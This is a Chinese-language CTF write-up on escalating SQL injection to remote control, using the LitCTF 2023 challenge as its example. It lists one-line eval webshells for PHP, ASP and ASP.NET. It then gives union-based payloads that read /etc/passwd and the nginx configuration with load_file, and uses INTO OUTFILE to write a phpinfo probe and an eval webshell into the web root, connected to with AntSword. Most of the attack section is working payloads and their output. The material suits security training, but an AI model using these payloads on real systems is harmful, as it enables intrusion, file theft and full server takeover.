---
# Sql注入os远程控制
## 一句话木马
一句话木马是一种短小而精悍的木马客户端，隐蔽性好，且功能强大。

* PHP:
```php
<?php @eval($_POST['chopper']);?>
```
* ASP:
```php
<%eval request("chopper")%>
```
* ASPNET:
```php
 <%@ Page Language="Jscript"%><%eval(Request.Item["chopper"],"unsafe");%>
```

## 前提条件
1. 需要知道远程目录
2. 需要远程目录有写权限
3. 需要数据库开启了secure file_priv

## into outfile
```sql
select 1,2 into outfile "/var/www/html/1.txt'
```
作用：将**select的结果**写入文件`/var/www/html/1.txt`
需要构造命令：
```sql
select <?php @eval($_POST['chopper']);?>,2 into outfile "/var/www/html/1.html'
```
## 操作
以***1[LitCTF 2023]这是什么？SQL ！注一下 ！*** 为例
### 收集信息
#### 系统用户的基本信息
```sql
# payload:
?id=-1)))))) union select load_file('/etc/passwd'),2%23

回显：
root:x:0:0:root:/root:/bin/ash 
bin:x:1:1:bin:/bin:/sbin/nologin 
daemon:x:2:2:daemon:/sbin:/sbin/nologin 
adm:x:3:4:adm:/var/adm:/sbin/nologin 
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin 
sync:x:5:0:sync:/sbin:/bin/sync 
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown 
halt:x:7:0:halt:/sbin:/sbin/halt 
mail:x:8:12:mail:/var/mail:/sbin/nologin 
news:x:9:13:news:/usr/lib/news:/sbin/nologin 
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin 
operator:x:11:0:operator:/root:/sbin/nologin 
man:x:13:15:man:/usr/man:/sbin/nologin 
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin 
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin 
ftp:x:21:21::/var/lib/ftp:/sbin/nologin 
sshd:x:22:22:sshd:/dev/null:/sbin/nologin 
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin 
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin 
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin 
games:x:35:35:games:/usr/games:/sbin/nologin 
cyrus:x:85:12::/usr/cyrus:/sbin/nologin 
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin 
ntp:x:123:123:NTP:/var/empty:/sbin/nologin 
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin 
guest:x:405:100:guest:/dev/null:/sbin/nologin 
nobody:x:65534:65534:nobody:/:/sbin/nologin 
www-data:x:82:82:Linux User,,,:/home/www-data:/sbin/nologin 
mysql:x:100:101:mysql:/var/lib/mysql:/sbin/nologin 
nginx:x:101:102:nginx:/var/lib/nginx:/sbin/nologin
```
Unix 或类 Unix 系统中的 /etc/passwd 文件的内容,包含了系统用户的基本信息
示例行的解释：
```
root:x:0:0:root:/root:/bin/ash：
登录名：    root
密码：      x（密码存储在 /etc/shadow）
用户 ID：   0
组 ID：     0
用户全名：  root
家目录：    /root
登录        shell：/bin/ash
```
#### 寻找网站根目录
接下来读取nginx配置文件
```sql
# payload:
?id=-1)))))) union select load_file('/etc/nginx/nginx.conf'),2%23

回显：
daemon off; worker_processes auto; error_log /var/log/nginx/error.log warn; events { worker_connections 1024; } http { include /etc/nginx/mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; server { listen 80; server_name localhost; root /var/www/html; index index.php; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; location / { try_files $uri $uri/ /index.php?$args; } location ~ \.php$ { try_files $uri =404; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; include fastcgi_params; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; } } }
```
```nginx
整理一下
# 运行 Nginx 为前台进程
daemon off;

# 根据可用 CPU 核心数自动设置工作进程数量
worker_processes auto;

# 设置错误日志文件的路径和日志级别
error_log /var/log/nginx/error.log warn;

# 事件处理模块配置
events {
    # 每个工作进程可以同时打开的最大连接数
    worker_connections 1024;
}

# HTTP 服务器配置
http {
    # 包含 MIME 类型定义文件
    include /etc/nginx/mime.types;
    
    # 默认的 MIME 类型
    default_type application/octet-stream;
    
    # 启用 sendfile，提高文件传输性能
    sendfile on;
    
    # 设置保持连接的超时时间
    keepalive_timeout 65;
    
    # 虚拟主机配置
    server {
        # 监听端口 80
        listen 80;
        
        # 服务器名称
        server_name localhost;
        
        # 网站文件的根目录
        root /var/www/html;
        
        # 默认的索引文件
        index index.php;
        
        # 设置代理头信息
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        
        # 根目录的处理规则
        location / {
            try_files $uri$uri/ /index.php?$args;
        }
        
        # PHP 文件的处理规则
        location ~ \.php$ {
            try_files $uri =404;
            fastcgi_pass 127.0.0.1:9000;
            fastcgi_index index.php;
            include fastcgi_params;
            fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        }
    }
}

```
找到网站根目录：`/var/www/html`
#### 写入php探针
```sql
# payload:
?id=-1)))))) union select '<?php phpinfo();?>',2 into outfile '/var/www/html/info.php'%23
```
然后访问http://node5.anna.nssctf.cn:24209/info.php      
可以看到`phpinfo`页面
#### 写入webshell
```sql
# payload:
?id=-1)))))) union select '<?php eval($_POST["attack"]);?>',2 into outfile '/var/www/html/attack.php'%23
```
我们在`/var/www/html/`创建了`attack.php`        
蚁剑连接：http://node6.anna.nssctf.cn:28413/attack.php      
密码`attack`      
然后就可以为所欲为了
接下来看***get shell后获取数据库.md***